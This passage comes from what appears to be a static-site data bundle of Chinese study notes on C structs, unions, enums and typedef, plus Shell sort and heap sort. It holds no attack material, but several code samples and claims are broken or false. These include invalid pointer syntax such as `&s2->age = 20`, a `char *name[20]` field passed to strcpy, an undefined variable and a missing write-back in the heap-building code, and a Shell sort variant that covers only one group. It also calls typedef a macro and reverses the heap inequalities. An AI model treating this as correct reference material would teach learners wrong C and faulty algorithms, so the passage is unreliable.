= 0; i < len; i++)\n    {\n        printf("arr[%d]->name = %s\\n", i, arr[i]->name);\n        printf("arr[%d]->age = %d\\n", i, arr[i]->age);\n        printf("arr[%d]->score = %f\\n", i, arr[i]->score);\n    }\n\n}\n\nint main(){\n\n    // 结构体数组的定义\n    struct Student s1 = {"张三", 18, 100};\n    struct Student s2 = {"李四", 19, 90};\n    struct Student s3 = {"王五", 20, 80};\n\n    struct Student *arr[3] = {&s1, &s2, &s3};\n\n    // 结构体指针数组做函数参数\n    printStudent(arr, 3);\n\n    return 0;\n\n}\n\n\n\n# const 修饰结构体指针做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针做函数参数\n\nvoid printStudent(const struct Student *p){\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n    p->age = 20; // error\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct Student s1 = {"张三", 18, 100};\n\n    // 结构体指针做函数参数\n    printStudent(&s1);\n\n    return 0;\n\n}\n\n\n\n\n# 共用体(联合体)\n\n * 共用体是一种特殊的数据类型，允许在相同的内存位置存储不同的数据类型。\n * 可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值，共用体提供了一种使用相同的内存位置的有效方式。\n * 共用体占用的内存应足够存储共用体中最大的成员。\n * 共用体的声明和结构体类似，但是必须使用union关键字。\n * 共用体的初始化和结构体类似，但是只能初始化第一个成员。\n * 共用体的成员地址和其他成员地址相同，共用体的成员地址和共用体变量地址相同。\n\n示例：\n\n#include <stdio.h>\n\nunion MyUnion\n{\n\n    int a;\n    char b;\n    float c;\n\n};\n\nint main(){\n\n    union MyUnion u1 = {1};\n\n    printf("u1.a = %d\\n", u1.a);\n    printf("u1.b = %c\\n", u1.b);\n    printf("u1.c = %f\\n", u1.c);\n\n    //所有成员的地址都是一样的\n    printf("&u1.a = %p\\n", &u1.a);\n\n    return 0;\n\n}\n\n\n\n\n# 枚举\n\n * 枚举是一种用户自定义的数据类型，用于定义变量，可以将变量的值一一列举出来。\n * 枚举的每个值都可以叫做枚举的一个成员，每个成员都可以赋予一个值，如果没有赋值，系统会默认赋值。\n * 枚举的定义和结构体类似，但是必须使用enum关键字。\n * 枚举值是常量，不能在程序中用赋值语句再对它赋值\n * 枚举值的默认值从0开始，依次加1，如果前面一个成员赋值，后面没有赋值的成员会在前一个成员的基础上加1。\n\n示例：\n\n#include <stdio.h>\n\nenum Season\n{\n\n    spring,\n    summer,\n    autumn,\n    winter\n\n};\n\nint main(){\n\n    enum Season s1 = spring;\n    enum Season s2 = summer;\n    enum Season s3 = autumn;\n    enum Season s4 = winter;\n\n    printf("s1 = %d\\n", s1);\n    printf("s2 = %d\\n", s2);\n    printf("s3 = %d\\n", s3);\n    printf("s4 = %d\\n", s4);\n\n    return 0;\n\n}\n\n\n\n\n# typedef\n\n> typedef 是C语言中的一个关键字，用来为类型取一个新的名字，可以使用 typedef 为 int 取一个新的名字叫 myInt ，这样以后就可以用 myInt 来定义变量了。\n\n * typedef的作用是为一种数据类型定义一个新的名字，可以使用这个新的名字来定义变量。\n * typedef的语法：typedef 数据类型 新名字;\n * typedef的本质是给数据类型起一个别名，本质上是一个宏定义。\n * typedef仅限于为数据类型定义别名，不能为变量定义别名。\n\n示例：\n\n\n#include <stdio.h>\n\ntypedef int myInt;\n\nint main(){\n\n    myInt a = 10;\n    printf("a = %d\\n", a);\n\n    return 0;\n\n}\n\n',normalizedContent:'# 结构体\n\n> c语言中的结构体是一种构造数据类型，它可以存储不同类型的数据项，这些数据项可以是基本数据类型，也可以是构造数据类型，甚至可以是结构体类型。\n\n示例\n\n#include <stdio.h>\n\nstruct mystruct\n{\n    int a;\n    char b;\n    float c;\n};\n\nint main(){\n\n    struct mystruct s1 = {1, \'a\', 1.1};\n    struct mystruct s2 = {2, \'b\', 2.2};\n\n    printf("s1.a = %d\\n", s1.a);\n    printf("s1.b = %c\\n", s1.b);\n    printf("s1.c = %f\\n", s1.c);\n\n    printf("s2.a = %d\\n", s2.a);\n    printf("s2.b = %c\\n", s2.b);\n    printf("s2.c = %f\\n", s2.c);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体的定义和初始化\n\n定义结构体变量的方式：\n\n * struct 结构体类型名 变量名;\n * struct 结构体类型名 变量名 = {成员1的初始值, 成员2的初始值, ...};\n * 直接定义结构体变量的成员(无需结构体类型名)\n\n示例：\n\n#include <stdio.h>\n\n// `struct 结构体类型名 变量名;`\n\nstruct mystruct1\n{\n\n    int a;\n    char b;\n    float c;\n\n}; \nstruct mystruct1 s0; \n\n// `struct 结构体类型名 变量名 = {成员1的初始值, 成员2的初始值, ...};`\n\nstruct mystruct2\n{\n\n    int a;\n    char b;\n    float c;\n\n} s1 = {1, \'a\', 1.1}; \n\n// 直接定义结构体变量的成员(无需结构体类型名)\nstruct\n{\n\n    int a;\n    char b;\n    float c;\n\n} s2 = {2, \'b\', 2.2}; \n\n\n\n结构体类型和结构体变量关系\n\n * 结构体类型：指定一个结构体的类型，可以定义多个结构体变量。没有具体数据，只是一个模板。系统也不分配内存。\n * 结构体变量：根据结构体类型定义的变量，有具体的数据，系统会分配内存。\n\n结构体类型定义的方式\n\n * struct 结构体类型名 {成员列表};\n * typedef struct 结构体类型名 {成员列表} 结构体类型别名;\n\n示例：\n\n#include <stdio.h>\n\n// `struct 结构体类型名 {成员列表};`\n\nstruct mystruct1\n{\n\n    int a;\n    char b;\n    float c;\n\n};\n\n// `typedef struct 结构体类型名 {成员列表} 结构体类型别名;`\n\ntypedef struct mystruct2\n{\n\n    int a;\n    char b;\n    float c;\n\n} mystruct2;\n\nint main(){\n\n    struct mystruct1 s1 = {1, \'a\', 1.1};\n    mystruct2 s2 = {2, \'b\', 2.2};\n\n    printf("s1.a = %d\\n", s1.a);\n    printf("s1.b = %c\\n", s1.b);\n    printf("s1.c = %f\\n", s1.c);\n\n    printf("s2.a = %d\\n", s2.a);\n    printf("s2.b = %c\\n", s2.b);\n    printf("s2.c = %f\\n", s2.c);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体成员的使用\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体的定义\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体变量的定义\n    struct student s1 = {"张三", 18, 100};\n    struct student s2 = {"李四", 19, 90};\n\n    // 结构体变量的使用\n    printf("s1.name = %s\\n", s1.name);\n    printf("s1.age = %d\\n", s1.age);\n    printf("s1.score = %f\\n", s1.score);\n\n    printf("s2.name = %s\\n", s2.name);\n    printf("s2.age = %d\\n", s2.age);\n    printf("s2.score = %f\\n", s2.score);\n\n    // 结构体变量的赋值\n    strcpy(s2.name, "王五");\n    s2.age = 20;\n    s2.score = 80;\n\n    // 如果是指针变量\n    strcpy(&s2->name, "王五");\n    &s2->age = 20;\n\n    printf("s2.name = %s\\n", s2.name);\n    printf("s2.age = %d\\n", s2.age);\n    printf("s2.score = %f\\n", s2.score);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体数组\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n  struct student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  }; \n\n  int main(){\n\n      // 结构体数组的定义\n      struct student arr[3] = {\n          {"张三", 18, 100},\n          {"李四", 19, 90},\n          {"王五", 20, 80}\n      };\n\n      // 结构体数组的使用\n      for (int i = 0; i < 3; i++)\n      {\n          printf("arr[%d].name = %s\\n", i, arr[i].name);\n          printf("arr[%d].age = %d\\n", i, arr[i].age);\n          printf("arr[%d].score = %f\\n", i, arr[i].score);\n      }\n\n      // 结构体数组的赋值\n      strcpy(arr[2].name, "赵六");\n      arr[2].age = 21;\n      arr[2].score = 70;\n\n      printf("arr[2].name = %s\\n", arr[2].name);\n      printf("arr[2].age = %d\\n", arr[2].age);\n      printf("arr[2].score = %f\\n", arr[2].score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体互相嵌套\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n\n  struct student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  struct teacher\n  {\n\n      int id;\n      char name[20];\n      int age;\n      struct student stu;\n\n  };\n\n  int main(){\n\n      // 结构体变量的定义\n      struct teacher t1 = {1, "张三", 30, {"李四", 18, 100}};\n\n      // 结构体变量的使用\n      printf("t1.id = %d\\n", t1.id);\n      printf("t1.name = %s\\n", t1.name);\n      printf("t1.age = %d\\n", t1.age);\n      printf("t1.stu.name = %s\\n", t1.stu.name);\n      printf("t1.stu.age = %d\\n", t1.stu.age);\n      printf("t1.stu.score = %f\\n", t1.stu.score);\n\n      // 结构体变量的赋值\n      strcpy(t1.stu.name, "王五");\n      t1.stu.age = 20;\n      t1.stu.score = 80;\n\n      printf("t1.stu.name = %s\\n", t1.stu.name);\n      printf("t1.stu.age = %d\\n", t1.stu.age);\n      printf("t1.stu.score = %f\\n", t1.stu.score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体赋值\n\n> 结构体变量之间可以相互赋值，但是不能相互比较大小\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n  struct student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  int main(){\n\n      // 结构体变量的定义\n      struct student s1 = {"张三", 18, 100};\n      struct student s2;\n\n      // 结构体变量的赋值\n      s2 = s1;\n\n      // 结构体变量的使用\n      printf("s2.name = %s\\n", s2.name);\n      printf("s2.age = %d\\n", s2.age);\n      printf("s2.score = %f\\n", s2.score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体指针\n\n# 指向普通结构体变量的指针\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体变量的定义\n    struct student s1 = {"张三", 18, 100};\n\n    // 结构体指针的定义\n    struct student *p = &s1;\n\n    // 结构体指针的使用\n    printf("s1.name = %s\\n", s1.name);\n    printf("s1.age = %d\\n", s1.age);\n    printf("s1.score = %f\\n", s1.score);\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n    printf("(*p).name = %s\\n", (*p).name);\n    printf("(*p).age = %d\\n", (*p).age);\n    printf("(*p).score = %f\\n", (*p).score);\n\n    return 0;\n\n}\n\n\n\n# 堆区结构体变量\n\n  #include <stdio.h>\n  #include <string.h>\n  #include <stdlib.h>\n\n  // 结构体类型的定义\n\n  struct student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  int main(){\n\n      // 结构体指针的定义\n      struct student *p = malloc(sizeof(struct student));\n\n      // 结构体指针的使用\n      strcpy(p->name, "张三");\n      p->age = 18;\n      p->score = 100;\n\n      printf("p->name = %s\\n", p->name);\n      printf("p->age = %d\\n", p->age);\n      printf("p->score = %f\\n", p->score);\n\n      return 0;\n\n  }\n\n\n\n# 结构体套一级指针\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\n// 结构体类型的定义\nstruct student\n{\n\n    char *name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体指针的定义\n    struct student *p = malloc(sizeof(struct student));\n\n    // 结构体指针的使用\n    strcpy(p->name, "张三");\n    p->age = 18;\n    p->score = 100;\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体做函数参数\n\n# 结构体普通变量做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体变量做函数参数\n\nvoid printstudent(struct student s){\n\n    printf("s.name = %s\\n", s.name);\n    printf("s.age = %d\\n", s.age);\n    printf("s.score = %f\\n", s.score);\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct student s1 = {"张三", 18, 100};\n\n    // 结构体变量做函数参数\n    printstudent(s1);\n\n    return 0;\n\n}\n\n\n\n# 结构体指针做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针做函数参数\n\nvoid printstudent(struct student *p){\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct student s1 = {"张三", 18, 100};\n\n    // 结构体指针做函数参数\n    printstudent(&s1);\n\n    return 0;\n\n}\n\n\n\n# 结构体数组做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体数组做函数参数\n\nvoid printstudent(struct student arr[], int len){\n\n    for (int i = 0; i < len; i++)\n    {\n        printf("arr[%d].name = %s\\n", i, arr[i].name);\n        printf("arr[%d].age = %d\\n", i, arr[i].age);\n        printf("arr[%d].score = %f\\n", i, arr[i].score);\n    }\n\n}\n\nint main(){\n\n    // 结构体数组的定义\n    struct student arr[3] = {\n        {"张三", 18, 100},\n        {"李四", 19, 90},\n        {"王五", 20, 80}\n    };\n\n    // 结构体数组做函数参数\n    printstudent(arr, 3);\n\n    return 0;\n\n}\n\n\n\n# 结构体指针数组做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针数组做函数参数\n\nvoid printstudent(struct student *arr[], int len){\n\n    for (int i = 0; i < len; i++)\n    {\n        printf("arr[%d]->name = %s\\n", i, arr[i]->name);\n        printf("arr[%d]->age = %d\\n", i, arr[i]->age);\n        printf("arr[%d]->score = %f\\n", i, arr[i]->score);\n    }\n\n}\n\nint main(){\n\n    // 结构体数组的定义\n    struct student s1 = {"张三", 18, 100};\n    struct student s2 = {"李四", 19, 90};\n    struct student s3 = {"王五", 20, 80};\n\n    struct student *arr[3] = {&s1, &s2, &s3};\n\n    // 结构体指针数组做函数参数\n    printstudent(arr, 3);\n\n    return 0;\n\n}\n\n\n\n# const 修饰结构体指针做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针做函数参数\n\nvoid printstudent(const struct student *p){\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n    p->age = 20; // error\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct student s1 = {"张三", 18, 100};\n\n    // 结构体指针做函数参数\n    printstudent(&s1);\n\n    return 0;\n\n}\n\n\n\n\n# 共用体(联合体)\n\n * 共用体是一种特殊的数据类型，允许在相同的内存位置存储不同的数据类型。\n * 可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值，共用体提供了一种使用相同的内存位置的有效方式。\n * 共用体占用的内存应足够存储共用体中最大的成员。\n * 共用体的声明和结构体类似，但是必须使用union关键字。\n * 共用体的初始化和结构体类似，但是只能初始化第一个成员。\n * 共用体的成员地址和其他成员地址相同，共用体的成员地址和共用体变量地址相同。\n\n示例：\n\n#include <stdio.h>\n\nunion myunion\n{\n\n    int a;\n    char b;\n    float c;\n\n};\n\nint main(){\n\n    union myunion u1 = {1};\n\n    printf("u1.a = %d\\n", u1.a);\n    printf("u1.b = %c\\n", u1.b);\n    printf("u1.c = %f\\n", u1.c);\n\n    //所有成员的地址都是一样的\n    printf("&u1.a = %p\\n", &u1.a);\n\n    return 0;\n\n}\n\n\n\n\n# 枚举\n\n * 枚举是一种用户自定义的数据类型，用于定义变量，可以将变量的值一一列举出来。\n * 枚举的每个值都可以叫做枚举的一个成员，每个成员都可以赋予一个值，如果没有赋值，系统会默认赋值。\n * 枚举的定义和结构体类似，但是必须使用enum关键字。\n * 枚举值是常量，不能在程序中用赋值语句再对它赋值\n * 枚举值的默认值从0开始，依次加1，如果前面一个成员赋值，后面没有赋值的成员会在前一个成员的基础上加1。\n\n示例：\n\n#include <stdio.h>\n\nenum season\n{\n\n    spring,\n    summer,\n    autumn,\n    winter\n\n};\n\nint main(){\n\n    enum season s1 = spring;\n    enum season s2 = summer;\n    enum season s3 = autumn;\n    enum season s4 = winter;\n\n    printf("s1 = %d\\n", s1);\n    printf("s2 = %d\\n", s2);\n    printf("s3 = %d\\n", s3);\n    printf("s4 = %d\\n", s4);\n\n    return 0;\n\n}\n\n\n\n\n# typedef\n\n> typedef 是c语言中的一个关键字，用来为类型取一个新的名字，可以使用 typedef 为 int 取一个新的名字叫 myint ，这样以后就可以用 myint 来定义变量了。\n\n * typedef的作用是为一种数据类型定义一个新的名字，可以使用这个新的名字来定义变量。\n * typedef的语法：typedef 数据类型 新名字;\n * typedef的本质是给数据类型起一个别名，本质上是一个宏定义。\n * typedef仅限于为数据类型定义别名，不能为变量定义别名。\n\n示例：\n\n\n#include <stdio.h>\n\ntypedef int myint;\n\nint main(){\n\n    myint a = 10;\n    printf("a = %d\\n", a);\n\n    return 0;\n\n}\n\n',charsets:{cjk:!0}},{title:"希尔排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/02-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/02-希尔排序.md",key:"v-7f0e1f7e",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/02-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"基本思想",slug:"基本思想",normalizedTitle:"基本思想",charIndex:89},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:2014},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:2023},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:2117},{level:3,title:"稳定性",slug:"稳定性",normalizedTitle:"稳定性",charIndex:2143}],headersStr:"基本思想 算法分析 时间复杂度 空间复杂度 稳定性",content:"# 希尔排序\n\n> 是一个分组插入排序算法，是直接插入排序算法的一种更高效的改进版本。希尔排序是非稳定排序算法。该方法因 DL．Shell 于 1959 年提出而得名。\n\n\n# 基本思想\n\n> 先追求表中的元素部分有序，再逐渐逼近全局有序。\n\n 1. 先将待排序表分割成若干子表，对各个子表分别进行直接插入排序。缩小增量，再次分割子表，对子表进行直接插入排序，直到增量为 1，排序完成。\n\n//举例\nDL. Shel建议的增量序列为：n/2，n/4，…，1，称为希尔增量，最后一个增量值必须为1。\nint arr={9,1,2,5,7,4,8,6,3,5};\n//arr长度为10，第一次增量为10/2=5\n//分成5组，每组两个元素，分别进行直接插入排序\n\n//第一次分组为 {9,4} {1,8} {2,6} {5,3} {7,5}\n//第一次分组排序后为 {4,9} {1,8} {2,6} {3,5} {5,7}\n//第一次排序为 {4,1,2,3,5,9,8,6,5,7}\n\n//第二次增量为5/2=2\n//分成2组，每组5个元素，分别进行直接插入排序\n//第二次分组为 {4,2,5,8,5} {1,3,9,6,7}\n//第二次分组排序后为 {2,4,5,5,8} {1,3,6,7,9}\n//第二次排序为 {2,1,4,3,5,6,5,7,8,9}\n\n//第三次增量为2/2=1\n//分成1组，每组10个元素，分别进行直接插入排序\n//第三次分组为 {2,1,4,3,5,6,5,7,8,9}\n//第三次分组排序后为 {1,2,3,4,5,5,6,7,8,9}\n//第三次排序为 {1,2,3,4,5,5,6,7,8,9}\n\n//代码实现\nvoid shellSort(int *arr, int length) {\n    int i, j, temp, gap;\n    // 增量每次都/2 直到为1\n    for (gap = length / 2; gap > 0; gap /= 2) {\n        // 从第gap个元素开始，因为前面的元素默认是有序的\n        for (i = gap; i < length; ++i) {\n            // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n            if (arr[i] < arr[i - gap]) {\n                temp = arr[i];\n                // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移gap位\n\n                // 如果是多个分组的话 每次循环会切换一个分组 有点不好理解\n                for (j = i - gap; j >= 0 && arr[j] > temp; j -= gap) {\n                    arr[j + gap] = arr[j];\n                }\n                arr[j + gap] = temp;\n            }\n        }\n    }\n}\n\n//第二种实现方式 （这种方式比较好理解 每次插入排序都是 先处理每个分组的所有元素 在处理下一个分组）\nvoid shellSort1(int *arr, int length) {\n    int i = 0, j, temp, gap;\n    for (gap = length / 2; gap > 0; gap /= 2) {\n      // 这里的i++是为了每次循环都切换一个分组\n        i += 1;\n        for (j = i + gap; j < length; j += gap) {\n            if (arr[j] < arr[j - gap]) {\n                temp = arr[j];\n                int k = j - gap;\n                // 将当前分组的所有元素都对比一遍 确保当前分组的所有元素都是有序的\n                while (k >= 0 && arr[k] > temp) {\n                    arr[k + gap] = arr[k];\n                    k -= gap;\n                }\n                arr[k + gap] = temp;\n            }\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 时间复杂度\n\n> 和增量序列有关, 不太好计算确切的时间复杂度, 总体是优于直接插入排序的\n\n> 最坏情况下的时间复杂度为 O(n^2)\n\n * 和插入排序一样, 所有都是逆序的\n\n\n# 空间复杂度\n\n> O(1) 和插入排序一样\n\n\n# 稳定性\n\n> 不稳定\n\n * 例如: 5 8 5 2 9 这样一组数据, 第一次增量为 2, 5 和 5 交换了位置, 所以不稳定",normalizedContent:"# 希尔排序\n\n> 是一个分组插入排序算法，是直接插入排序算法的一种更高效的改进版本。希尔排序是非稳定排序算法。该方法因 dl．shell 于 1959 年提出而得名。\n\n\n# 基本思想\n\n> 先追求表中的元素部分有序，再逐渐逼近全局有序。\n\n 1. 先将待排序表分割成若干子表，对各个子表分别进行直接插入排序。缩小增量，再次分割子表，对子表进行直接插入排序，直到增量为 1，排序完成。\n\n//举例\ndl. shel建议的增量序列为：n/2，n/4，…，1，称为希尔增量，最后一个增量值必须为1。\nint arr={9,1,2,5,7,4,8,6,3,5};\n//arr长度为10，第一次增量为10/2=5\n//分成5组，每组两个元素，分别进行直接插入排序\n\n//第一次分组为 {9,4} {1,8} {2,6} {5,3} {7,5}\n//第一次分组排序后为 {4,9} {1,8} {2,6} {3,5} {5,7}\n//第一次排序为 {4,1,2,3,5,9,8,6,5,7}\n\n//第二次增量为5/2=2\n//分成2组，每组5个元素，分别进行直接插入排序\n//第二次分组为 {4,2,5,8,5} {1,3,9,6,7}\n//第二次分组排序后为 {2,4,5,5,8} {1,3,6,7,9}\n//第二次排序为 {2,1,4,3,5,6,5,7,8,9}\n\n//第三次增量为2/2=1\n//分成1组，每组10个元素，分别进行直接插入排序\n//第三次分组为 {2,1,4,3,5,6,5,7,8,9}\n//第三次分组排序后为 {1,2,3,4,5,5,6,7,8,9}\n//第三次排序为 {1,2,3,4,5,5,6,7,8,9}\n\n//代码实现\nvoid shellsort(int *arr, int length) {\n    int i, j, temp, gap;\n    // 增量每次都/2 直到为1\n    for (gap = length / 2; gap > 0; gap /= 2) {\n        // 从第gap个元素开始，因为前面的元素默认是有序的\n        for (i = gap; i < length; ++i) {\n            // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n            if (arr[i] < arr[i - gap]) {\n                temp = arr[i];\n                // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移gap位\n\n                // 如果是多个分组的话 每次循环会切换一个分组 有点不好理解\n                for (j = i - gap; j >= 0 && arr[j] > temp; j -= gap) {\n                    arr[j + gap] = arr[j];\n                }\n                arr[j + gap] = temp;\n            }\n        }\n    }\n}\n\n//第二种实现方式 （这种方式比较好理解 每次插入排序都是 先处理每个分组的所有元素 在处理下一个分组）\nvoid shellsort1(int *arr, int length) {\n    int i = 0, j, temp, gap;\n    for (gap = length / 2; gap > 0; gap /= 2) {\n      // 这里的i++是为了每次循环都切换一个分组\n        i += 1;\n        for (j = i + gap; j < length; j += gap) {\n            if (arr[j] < arr[j - gap]) {\n                temp = arr[j];\n                int k = j - gap;\n                // 将当前分组的所有元素都对比一遍 确保当前分组的所有元素都是有序的\n                while (k >= 0 && arr[k] > temp) {\n                    arr[k + gap] = arr[k];\n                    k -= gap;\n                }\n                arr[k + gap] = temp;\n            }\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 时间复杂度\n\n> 和增量序列有关, 不太好计算确切的时间复杂度, 总体是优于直接插入排序的\n\n> 最坏情况下的时间复杂度为 o(n^2)\n\n * 和插入排序一样, 所有都是逆序的\n\n\n# 空间复杂度\n\n> o(1) 和插入排序一样\n\n\n# 稳定性\n\n> 不稳定\n\n * 例如: 5 8 5 2 9 这样一组数据, 第一次增量为 2, 5 和 5 交换了位置, 所以不稳定",charsets:{cjk:!0}},{title:"堆排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/06-%E5%A0%86%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/06-堆排序.md",key:"v-51ff2b5c",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/06-%E5%A0%86%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"1. 堆的定义",slug:"_1-堆的定义",normalizedTitle:"1. 堆的定义",charIndex:46},{level:3,title:"二叉树的顺序存储",slug:"二叉树的顺序存储",normalizedTitle:"二叉树的顺序存储",charIndex:82},{level:3,title:"大根堆",slug:"大根堆",normalizedTitle:"大根堆",charIndex:69},{level:3,title:"小根堆",slug:"小根堆",normalizedTitle:"小根堆",charIndex:73},{level:2,title:"2. 建立堆",slug:"_2-建立堆",normalizedTitle:"2. 建立堆",charIndex:757},{level:3,title:"建立大根堆",slug:"建立大根堆",normalizedTitle:"建立大根堆",charIndex:1139},{level:2,title:"3. 堆排序(大根堆)",slug:"_3-堆排序-大根堆",normalizedTitle:"3. 堆排序(大根堆)",charIndex:1605},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:1909},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:1918},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:1936},{level:3,title:"稳定性",slug:"稳定性",normalizedTitle:"稳定性",charIndex:1990}],headersStr:"1. 堆的定义 二叉树的顺序存储 大根堆 小根堆 2. 建立堆 建立大根堆 3. 堆排序(大根堆) 算法分析 空间复杂度 时间复杂度 稳定性",content:"# 堆排序\n\n> 堆排序是一种树形选择排序，选择最小或最大的元素加入到有序序列中。\n\n\n# 1. 堆的定义\n\n> 堆是一种完全二叉树，分为大根堆和小根堆。\n\n\n# 二叉树的顺序存储\n\n> 二叉树的顺序存储是将二叉树的节点按照层序遍历的顺序存储到数组中。\n\n下标从1开始，对于任意节点i，有：\n\n * i的父节点：i/2\n * i的左孩子节点：2i\n * i的右孩子节点：2i+1\n * i的最后一个叶子节点：n/2\n * i所在的层：log2(n+1)或log2n+1\n\n\n# 大根堆\n\n> 每个节点的值都大于或等于其左右孩子节点的值。\n\nL(i) <= L(2i+1) && L(i) <= L(2i+2) 1<=i<=n/2\n\nint a=[0,87,45,78,32,17,65,53,09] //存储堆的数组\n//变成二叉树就是(逻辑上的)\n//          87\n//      45      78\n//    32  17  65  53\n//   09\n\n\n大根堆的特点：\n\n 1. 根节点的值最大\n 2. 根节点的值大于左右孩子节点的值 根>=左 && 根>=右\n\n\n# 小根堆\n\n> 每个节点的值都小于或等于其左右孩子节点的值。\n\nL(i) >= L(2i+1) && L(i) >= L(2i+2) 1<=i<=n/2\n\nint a=[0,09,17,32,45,78,65,53,87] //存储堆的数组\n//变成二叉树就是(逻辑上的)\n//          09\n//      17      32\n//    45  78  65  53\n//   87\n\n\n小根堆的特点：\n\n 1. 根节点的值最小\n 2. 根节点的值小于左右孩子节点的值 根<=左 && 根<=右\n\n\n# 2. 建立堆\n\n> 把所有的非终端节点都检查一遍，使其满足堆的性质。如果不满足，就调整。\n\n检查当前节点是否满足堆的性质，如果不满足，将当前节点与更大的一个或者更小的一个孩子节点交换，直到满足堆的性质。\n\n//举例\nint a=[0,53,17,78,09,45,65,87,32] //存储堆的数组\n\n//第一次检查 53，17，78，09\n\n//          53\n//      17      78\n//    09  45  65  87\n//   32\n\n// 上述树的非终端节点有4个，分别是53,17,78,09  从后往前查找 也就是 i/2。 09不满足堆的性质，将09与左右孩子中较大的一个交换\n\n//          53\n//      17      78\n//    32  45  65  87\n//   09\n\n\n\n\n# 建立大根堆\n\nint a=[0,53,17,78,09,45,65,87,32] //存储堆的数组\n\nvoid buildMaxHeap(int a[],int len){\n  //从最后一个非终端节点开始，从后往前检查\n    for(int i=n/2;i>0;i--){\n        heapify(a,i,len);\n    }\n}\n\nvoid heapify(int a[],int n,int len){\n  a[0]=a[n];  //a[0]暂存当前节点\n  for(int i=2*n;i<=len;i*=2){\n    if(i<len && a[i]<a[i+1]){ //找到左右孩子中较大的一个\n      i++;\n    }\n    if(a[0]>=a[i]){ //如果当前节点大于左右孩子中较大的一个，不需要交换\n      break;\n    }else{\n      a[n]=a[i]; //否则交换\n      n=i; //继续检查\n    }\n  }\n\n}\n    \n\n\n\n# 3. 堆排序(大根堆)\n\n> 选择排序：每一趟在待排序中选取最大的元素放到有序序列中。\n\n堆排序 